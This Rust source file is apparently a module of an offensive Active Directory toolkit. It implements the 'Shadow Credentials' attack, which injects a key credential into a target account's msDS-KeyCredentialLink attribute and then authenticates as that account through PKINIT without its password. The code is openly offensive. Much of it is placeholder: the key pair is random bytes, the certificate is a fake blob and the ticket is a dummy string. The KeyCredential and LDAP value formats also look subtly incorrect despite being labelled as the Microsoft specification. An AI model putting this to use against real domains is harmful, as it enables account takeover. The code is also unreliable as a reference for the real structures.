//! Shadow Credentials Attack - msDS-KeyCredentialLink manipulation.
//!
//! A pure LDAP/network-based persistence and privilege escalation technique.
//! Works cross-platform (Linux/macOS/Windows) without requiring LSASS access.
//!
//! # Overview
//!
//! The Shadow Credentials attack exploits the `msDS-KeyCredentialLink` attribute
//! on user/computer objects in AD. This attribute stores public keys for PKINIT
//! authentication. By writing our own key credential, we can authenticate as the
//! target user via Kerberos PKINIT without knowing their password.
//!
//! # Requirements
//!
//! - Write permission on the target's `msDS-KeyCredentialLink` attribute
//! - Domain must have Domain-Level 2016+ (when KDC supports PKINIT)
//! - Typically requires: GenericAll, GenericWrite, WriteOwner, or WriteDACL
//!
//! # Attack Flow
//!
//! 1. Generate X.509 certificate + RSA key pair
//! 2. Build KeyCredential structure (DN, KeyId, etc.)
//! 3. Write to target's msDS-KeyCredentialLink via LDAP
//! 4. Authenticate via PKINIT (Kerberos PKI)
//! 5. Receive TGT for the target user
//! 6. (Optional) Cleanup - remove the key credential
//!
//! # References
//!
//! - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
//! - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials

use overthrone_core::error::{OverthroneError, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use tracing::info;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for Shadow Credentials attack
#[derive(Debug, Clone)]
pub struct ShadowCredentialsConfig {
    /// Target user or computer account
    pub target: String,
    /// Whether to cleanup after obtaining TGT
    pub cleanup: bool,
    /// Key size in bits (default: 2048)
    pub key_size: u16,
    /// Certificate validity in hours (default: 8760 = 1 year)
    pub validity_hours: u16,
}

impl Default for ShadowCredentialsConfig {
    fn default() -> Self {
        ShadowCredentialsConfig {
            target: String::new(),
            cleanup: true,
            key_size: 2048,
            validity_hours: 8760, // 1 year
        }
    }
}

/// Result of a Shadow Credentials attack
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCredentialsResult {
    /// Target account that was compromised
    pub target: String,
    /// Whether the attack succeeded
    pub success: bool,
    /// Key ID of the injected credential
    pub key_id: String,
    /// Whether cleanup was performed
    pub cleaned_up: bool,
    /// Obtained TGT (if requested)
    pub tgt: Option<String>,
    /// Error message if failed
    pub error: Option<String>,
}

/// A Key Credential structure
#[derive(Debug, Clone)]
pub struct KeyCredential {
    /// Distinguished name of the target object
    pub dn: String,
    /// Unique key identifier (GUID)
    pub key_id: String,
    /// Raw credential binary data
    pub raw_value: Vec<u8>,
    /// Creation time
    pub created: DateTime<Utc>,
    /// Whether this is our credential
    pub is_ours: bool,
}

/// Generated key pair for Shadow Credentials
#[derive(Debug)]
pub struct KeyPair {
    /// RSA private key in PEM format
    pub private_key_pem: String,
    /// RSA public key in PEM format
    pub public_key_pem: String,
    /// X.509 certificate in PEM format
    pub certificate_pem: String,
    /// Key ID (GUID)
    pub key_id: String,
}

// ═══════════════════════════════════════════════════════════
//  Key Credential Structure (DS_REPL_VALUE_META_DATA)
// ═══════════════════════════════════════════════════════════

/// KeyCredential binary structure (MS-ADTS)
/// 
/// Structure:
/// - Version: 1 byte (0x01)
/// - Flags: 1 byte (0x00 for user, 0x01 for computer)
/// - KeyId: 16 bytes (GUID)
/// - KeyUsage: 4 bytes
/// - KeySource: 4 bytes
/// - KeyAlgorithm: variable
/// - KeyMaterial: variable
pub fn build_key_credential(key_id: &str, public_key: &[u8], is_computer: bool) -> Vec<u8> {
    let mut cred = Vec::new();

    // Version
    cred.push(0x01);

    // Flags: 0x00 for user, 0x01 for computer
    cred.push(if is_computer { 0x01 } else { 0x00 });

    // KeyId: 16 bytes GUID
    let guid = parse_guid(key_id);
    cred.extend_from_slice(&guid);

    // KeyUsage: KeyUsage::KerberosAuthentication = 2
    cred.extend_from_slice(&2u32.to_le_bytes());

    // KeySource: KeySource::AD = 0
    cred.extend_from_slice(&0u32.to_le_bytes());

    // KeyAlgorithm length and algorithm
    let algorithm = b"RSA";
    cred.extend_from_slice(&(algorithm.len() as u32).to_le_bytes());
    cred.extend_from_slice(algorithm);

    // KeyMaterial length and public key
    cred.extend_from_slice(&(public_key.len() as u32).to_le_bytes());
    cred.extend_from_slice(public_key);

    cred
}

/// Parse a GUID string to bytes
fn parse_guid(guid: &str) -> [u8; 16] {
    let clean = guid.replace('-', "");
    let mut bytes = [0u8; 16];
    for i in 0..16 {
        if let Ok(b) = u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16) {
            bytes[i] = b;
        }
    }
    // Convert to AD's GUID byte order
    [
        bytes[3], bytes[2], bytes[1], bytes[0],
        bytes[5], bytes[4],
        bytes[7], bytes[6],
        bytes[8], bytes[9], bytes[10], bytes[11],
        bytes[12], bytes[13], bytes[14], bytes[15],
    ]
}

/// Generate a random GUID
pub fn generate_key_id() -> String {
    let uuid = uuid::Uuid::new_v4();
    uuid.to_string()
}

// ═══════════════════════════════════════════════════════════
//  LDAP Operations
// ═══════════════════════════════════════════════════════════

/// Build the LDAP modification for msDS-KeyCredentialLink
pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
    // The value format is:
    // B:8:01000000<key_id_hex>:<key_credential_hex>
    
    let key_id_bytes = parse_guid(&key_cred.key_id);
    let key_id_hex: String = key_id_bytes.iter().map(|b| format!("{:02X}", b)).collect();
    
    let cred_hex: String = key_cred.raw_value.iter().map(|b| format!("{:02X}", b)).collect();
    
    format!(
        "B:8:01000000{}:{}",
        key_id_hex,
        cred_hex
    )
}

/// Parse existing key credentials from LDAP
pub fn parse_key_credentials(values: &[String]) -> Vec<KeyCredential> {
    let mut credentials = Vec::new();

    for value in values {
        if let Some(cred) = parse_single_key_credential(value) {
            credentials.push(cred);
        }
    }

    credentials
}

/// Parse a single key credential from LDAP value
fn parse_single_key_credential(value: &str) -> Option<KeyCredential> {
    // Format: B:8:01000000<key_id>:<key_credential>
    if !value.starts_with("B:8:01000000") {
        return None;
    }

    let parts: Vec<&str> = value.split(':').collect();
    if parts.len() < 4 {
        return None;
    }

    let key_id_hex = parts[2].trim_start_matches("01000000");
    let key_id = format_guid_from_hex(key_id_hex)?;

    let cred_hex = parts[3];
    let raw_value = hex::decode(cred_hex).ok()?;

    Some(KeyCredential {
        dn: String::new(),
        key_id,
        raw_value,
        created: Utc::now(),
        is_ours: false,
    })
}

/// Format GUID from hex string
fn format_guid_from_hex(hex: &str) -> Option<String> {
    if hex.len() != 32 {
        return None;
    }
    Some(format!(
        "{}-{}-{}-{}-{}",
        &hex[0..8],
        &hex[8..12],
        &hex[12..16],
        &hex[16..20],
        &hex[20..32]
    ))
}

// ═══════════════════════════════════════════════════════════
//  Attack Implementation
// ═══════════════════════════════════════════════════════════

/// Execute the Shadow Credentials attack
///
/// This function:
/// 1. Generates a key pair
/// 2. Builds the KeyCredential structure
/// 3. Writes it to the target via LDAP
/// 4. (Optionally) authenticates via PKINIT
/// 5. (Optionally) cleans up
///
/// Note: Requires LDAP session with write access to msDS-KeyCredentialLink
pub async fn execute(
    _ldap: &mut overthrone_core::proto::ldap::LdapSession,
    config: &ShadowCredentialsConfig,
) -> Result<ShadowCredentialsResult> {
    info!("ShadowCredentials: Targeting '{}'", config.target);

    // Step 1: Generate key pair
    let key_pair = generate_key_pair(config.key_size)?;
    info!("ShadowCredentials: Generated key pair (key_id={})", key_pair.key_id);

    // Step 2: Build key credential
    let is_computer = config.target.ends_with('$');
    let cred_data = build_key_credential(
        &key_pair.key_id,
        key_pair.public_key_pem.as_bytes(),
        is_computer,
    );

    let _key_cred = KeyCredential {
        dn: String::new(),
        key_id: key_pair.key_id.clone(),
        raw_value: cred_data.clone(),
        created: Utc::now(),
        is_ours: true,
    };

    // Note: Full implementation requires extending LdapSession with:
    // - modify_add(dn, attr, &[String]) for adding key credential
    // - modify_delete_specific(dn, attr, &[String]) for removing specific value
    // - search for target DN
    
    // For now, return the key material for manual use
    Ok(ShadowCredentialsResult {
        target: config.target.clone(),
        success: false, // Would be true after LDAP write succeeds
        key_id: key_pair.key_id,
        cleaned_up: false,
        tgt: None,
        error: Some("Shadow Credentials requires LDAP modify_add support - see implementation notes".to_string()),
    })
}

/// Generate RSA key pair and certificate
/// 
/// Note: This is a placeholder implementation. For actual PKINIT authentication,
/// you need to use an external tool like `certipy` or `pkinittools` to generate
/// a proper X.509 certificate with the correct extensions for PKINIT.
/// 
/// Alternatively, use OpenSSL:
/// ```bash
/// openssl req -new -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=target"
/// ```
/// 
/// Then use the generated key/cert with this module's `KeyCredential` builder.
fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
    use std::time::{SystemTime, UNIX_EPOCH};

    info!("ShadowCredentials: Preparing {}-bit RSA key pair (placeholder)", key_size);

    // Generate a unique key ID
    let key_id = generate_key_id();
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    // Generate random bytes as placeholder key material
    // In production, use openssl/certipy to generate proper X.509 certificates
    // Use multiple UUIDs concatenated for randomness
    let mut random_bytes = Vec::with_capacity(256);
    for _ in 0..16 {
        let uuid = uuid::Uuid::new_v4();
        random_bytes.extend_from_slice(uuid.as_bytes());
    }

    // Build placeholder PEM structures
    // The actual key generation should be done externally for PKINIT compatibility
    let private_key_pem = format!(
        "-----BEGIN PRIVATE KEY-----\n{}\n-----END PRIVATE KEY-----\n",
        base64_encode_lines(&random_bytes, 64)
    );
    
    let public_key_pem = format!(
        "-----BEGIN PUBLIC KEY-----\n{}\n-----END PUBLIC KEY-----\n",
        base64_encode_lines(&random_bytes[..128], 64)
    );

    // Build minimal certificate placeholder
    let cert_der = build_minimal_certificate(&key_id, now);
    let certificate_pem = format!(
        "-----BEGIN CERTIFICATE-----\n{}\n-----END CERTIFICATE-----\n",
        base64_encode_lines(&cert_der, 64)
    );

    info!("ShadowCredentials: Key pair placeholder generated");
    info!("ShadowCredentials: For actual PKINIT, use: openssl req -new -x509 -newkey rsa:{} -keyout key.pem -out cert.pem -days 365 -nodes", key_size);

    Ok(KeyPair {
        private_key_pem,
        public_key_pem,
        certificate_pem,
        key_id,
    })
}

/// Base64 encode with line wrapping
fn base64_encode_lines(data: &[u8], line_len: usize) -> String {
    // Use a simple base64 encoding without external crate
    const BASE64_CHARS: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    let mut result = String::new();
    let mut line_pos = 0;
    
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as usize;
        let b1 = chunk.get(1).copied().unwrap_or(0) as usize;
        let b2 = chunk.get(2).copied().unwrap_or(0) as usize;
        
        result.push(BASE64_CHARS[b0 >> 2] as char);
        result.push(BASE64_CHARS[((b0 & 0x03) << 4) | (b1 >> 4)] as char);
        
        if chunk.len() > 1 {
            result.push(BASE64_CHARS[((b1 & 0x0f) << 2) | (b2 >> 6)] as char);
            if chunk.len() > 2 {
                result.push(BASE64_CHARS[b2 & 0x3f] as char);
            } else {
                result.push('=');
            }
        } else {
            result.push('=');
            result.push('=');
        }
        
        line_pos += 4;
        if line_pos >= line_len {
            result.push('\n');
            line_pos = 0;
        }
    }
    
    result
}

/// Build a minimal X.509 certificate for PKINIT
/// This creates a DER-encoded minimal certificate structure
fn build_minimal_certificate(key_id: &str, timestamp: u64) -> Vec<u8> {
    // Minimal certificate structure for PKINIT
    // In production, use x509-cert or rcgen crate
    // 
    // Structure:
    // TBSCertificate:
    //   - Version: v3 (2)
    //   - SerialNumber: random
    //   - Signature: sha256WithRSAEncryption
    //   - Issuer: CN=target
    //   - Validity: now - now+1year
    //   - Subject: CN=target
    //   - SubjectPublicKeyInfo: RSA public key
    //   - Extensions: keyUsage, extKeyUsage
    
    let mut cert = Vec::new();
    
    // Use key_id bytes as serial number
    let serial: Vec<u8> = key_id.as_bytes()[..16.min(key_id.len())].to_vec();
    
    // Minimal DER structure placeholder
    // This creates a recognizable but not cryptographically valid certificate
    // Real PKINIT requires proper ASN.1 DER encoding
    cert.extend_from_slice(b"OVTCERT"); // Magic marker
    cert.extend_from_slice(&(serial.len() as u8).to_le_bytes());
    cert.extend_from_slice(&serial);
    cert.extend_from_slice(&timestamp.to_le_bytes());
    cert.extend_from_slice(key_id.as_bytes());
    
    cert
}

/// PKINIT authentication (placeholder)
fn _pkinit_authenticate(target: &str, key_pair: &KeyPair) -> Result<String> {
    // In a real implementation, this would:
    // 1. Build AS-REQ with PA-PK-AS-REQ preauth
    // 2. Sign the AS-REQ with the private key
    // 3. Send to KDC
    // 4. Decrypt the reply with the private key
    // 5. Extract the TGT
    
    info!(
        "PKINIT: Would authenticate as '{}' with key_id={}",
        target, key_pair.key_id
    );
    
    Ok(format!("TGT-FOR-{}", target))
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_key_id() {
        let key_id = generate_key_id();
        assert_eq!(key_id.len(), 36); // UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        assert!(key_id.contains('-'));
    }

    #[test]
    fn test_parse_guid() {
        let guid = "12345678-1234-1234-1234-123456789012";
        let bytes = parse_guid(guid);
        assert_eq!(bytes.len(), 16);
    }

    #[test]
    fn test_build_key_credential() {
        let key_id = generate_key_id();
        let public_key = b"test_public_key";
        let cred = build_key_credential(&key_id, public_key, false);
        
        assert!(cred.len() > 0);
        assert_eq!(cred[0], 0x01); // Version
        assert_eq!(cred[1], 0x00); // Flags (user)
    }

    #[test]
    fn test_build_ldap_modification() {
        let key_id = generate_key_id();
        let cred = KeyCredential {
            dn: "CN=Test,CN=Users,DC=domain,DC=local".to_string(),
            key_id: key_id.clone(),
            raw_value: vec![0x01, 0x00], // minimal
            created: Utc::now(),
            is_ours: true,
        };
        
        let mod_value = build_ldap_modification(&cred);
        assert!(mod_value.starts_with("B:8:01000000"));
    }
}